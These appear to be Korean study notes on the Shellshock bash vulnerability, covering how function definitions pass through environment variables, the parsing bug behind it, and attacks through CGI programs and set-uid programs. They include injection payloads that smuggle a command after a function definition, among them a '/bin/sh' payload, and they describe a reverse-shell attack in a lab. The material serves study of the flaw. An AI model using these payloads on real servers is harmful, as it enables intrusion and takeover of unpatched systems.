
- 배경 : 쉘 함수
	- 쉘 프로그램은 운영 체제의 명령 줄 해석기
	- 사용자와 운영 체제 간의 인터페이스 제공
	- sh, bash, zsh 등 이 존재
	- bash 쉘은 가장 인기있는 linux 쉘 중 하나
	- 쉘 쇼크 취약점은 쉘 함수와 관련 있음
	- 예시
```shell
 $ foo() { echo "Inside Func"; }
 -> foo라는 함수를 정의
 $ declare -f foo
foo () 
{ 
    echo "Inside Func"
}
-> 함수의 정의를 확인
 $ foo
Inside Func
-> 함수 호출
 $ unset -f foo
 -> 함수 삭제
 $ declare -f foo
 -> 함수의 정의를 확인하면 아무것도 없다
```

- 자식 프로세스에 쉘 함수 전달하기
	- Approach 1 : 부모 쉘에서 함수를 정의하고 내보내면, 자식 프로세스에서 해당 함수 사용 가능
	**- 부모 프로세스도 쉘 프로세스여야 함**
	- 부모가 쉘 함수를 전달한다는 것은 자식 프로세스의 **환경 변수로써** 쉘 함수를 전달하는 것
	- ps $ x 2 로 현재 pid 확인 가능
	- 예시
```shell
$ foo() { echo "Inside Func"; }
 -> foo라는 함수를 정의
$ declare -f foo
foo () 
{ 
    echo "Inside Func"
}
-> 함수의 정의를 확인
$ foo
Inside Func
-> 함수 호출
$ export -f foo
-> 내보내기
$ bash 
-> 자식 프로세스 생성
$ ps $$
-> 자식 프로세스의 pid 나옴
$ declare -f foo
foo (){
	echo "Inside Func"
}
$ foo
Inside Func
```

- 부모 프로세스의 foo()를 unset 한다면 자식 프로세스의 foo()도 해제된다.
- Approach 2 : 환경 변수를 정의한다. 그것이 곧 차일드 배쉬 프로세스의 함수 정의가 된다.
	**- 부모 프로세스가 쉘 프로세스가 아니더라도 환경 변수만 가지고 있으면 된다**
```shell
$ foo = '() { echo "hello"; }'
$ echo $foo
() { echo "hello"; }
$ declare -f foo
-> 아직 쉘 변수 상태이므로 declare 안먹힘
$ export foo
-> export를 통해 child의 환경변수에 추가하고, shell function으로 변환
$ bash_shellshock
-> 취약한 버전의 bash를 차일드에서 실행
-------------------child------------------
$ echo $foo
-> foo는 더이상 shell 변수가 아닌, shell function이다
$ delcare -f foo
foo(){
	echo "hello"
}
$ foo
hello
```

- 두 approach 비교
	- 둘다 환경변수를 사용한다는 점에서 비슷하다
	- approach 1은 부모 쉘이 새 프로세스를 생성했을 때, 각 exported function definition을 환경변수로써 전달한다
	- 자식 프로세스가 bash를 실행하면 bash는 환경 변수를 함수 정의로 다시 해석 =. approach 2
	- approach 2는 부모 프로세스가 쉘 프로세스일 필요가 없다 → 환경변수만 사용 가능하면 됨

- shellshock vulnerability
	- 부모 프로세스는 환경 변수를 통해 자식 쉘 프로세스에 함수 정의 전달
	- 이때 구문 분석 논리 버그로 인해 bash는 변수에 포함된 일부 명령 실행
```shell
$ foo='() {echo "hello";}; echo "attack";'
$ echo $foo
() { echo "hello world"; }; echo "attack";
$ export foo
$ bash_shellshock
-> run bash (vulnerable ver)
attack
-> extra command gets executed!
-----------------child--------------------
$ echo $foo
-> shell function이므로 무응답
$ declare -f foo
foo (){
	echo "hello"
}
```

- bash code의 문제점
``` c
void initialize_shell_variables (char** env,int privmode) {

	if (privmode == 0 && read_but_dont_execute ==0 && STREQN ("() (",string,4)))
}
-> parsing하며
foo = () {echo "hello";}; echo "extra";를
foo () {echo "hello";}; echo "extra";로
코드를 전환한다 (등호 없애기)

parse_and_execute(temp_string, name, SEVAL_NONINT | SEVAL_NONIST);
-> 전환된 코드에서 세미콜론을 기준으로 foo(){echo "hello";} 실행 후 echo "extra"를 실행한다
```

- 위의 두 부분이 shellshock vulnerability이다
- shellshock vulnerability를 발생시키는 두 요인
	- 타겟 프로세스는 공격자에 의해 설정된 환경 변수를 가지고 있어야 함 (echo “attack” 등) 
	- 타겟 프로세스가 bash shell을 trigger 해야함
	  (bash_shellshock 등)
	- 타겟 프로세스가 SetUID 프로그램일 시 더욱 치명적일 것
- CGI 프로그램에 대한 Shellshock 공격
	- CGI는 웹 서버가 동적으로 웹 페이지를 생성하는 실행 프로그램을 실행하는데 사용
	- CGI 프로그램은 쉘 스크립트를 사용하며, bash 사용 시 shellshock에 취약할 수 있음
- CGI 프로그램을 이용한 공격 방법
	- 웹 서버가 CGI 프로그램 호출
		- 사용자가 CGI url을 아파치 웹서버에 보낼 때 아파치는 요청을 확인하고, cgi 요청인 경우 fork()를 사용해 새 프로세스를 시작하고, exec()함수를 사용해 cgi 프로그램 실행
		- cgi 프로그램이 #! /bin/bash_shellshock으로 시작하면, exec은 실제로 /bin/bash_shellshock 실행해 쉘 스크립트 실행
	- 사용자 데이터가 cgi 프로그램에 전달
		- 아파치가 자식 프로세스를 생성할 때 bash 프로그램(자식 프로세스)에 모든 환경 변수를 제공
		- curl -A 옵션을 사용해 사용자 Agent 필드를 원하는 값으로 변경 가능
	- shellshock 공격 실행
		- 악의적인 명령을 포함한 환경 변수를 설정해 공격 실행
		- 기본적으로 웹 서버는 우분투에서 www-data 사용자 id로 실행 → 이를 통해 서버를 완전히 장악 할 수는 없지만, 몇가지 피해를 줄 수 있는 작업 수행 가능
		- 예시) 리버스 쉘 생성
			- 공격자는 자신의 머신(10.9.0.1)에서 netcat 명령어를 실행해 리버스 쉘 연결을 기다림
			- 피해자 웹 서버 컨테이너 쉘에서 특정 명령어 실행해 리버스 쉘 생성
			- 명령어 실행 후, 공격자는 피해자 웹 서버(10.9.0.80)에서 연결 받음
			- 이후 공격자는 서버 머신에서 원하는 명령어 실행 가능
	- docker 명령어
		- docker-compose build: 이미지 빌드
		- docker-compose up: 서비스 시작
		- docker-composer down: 서비스 중지
		- docker ps: 실행중인 docker 컨테이너 id 목록
		- docksh <id> : id의 컨테이너 쉘 획득
	- shellshock attack on set-uid
		- export foo = ‘() { echo “hello” }; /bin/sh’
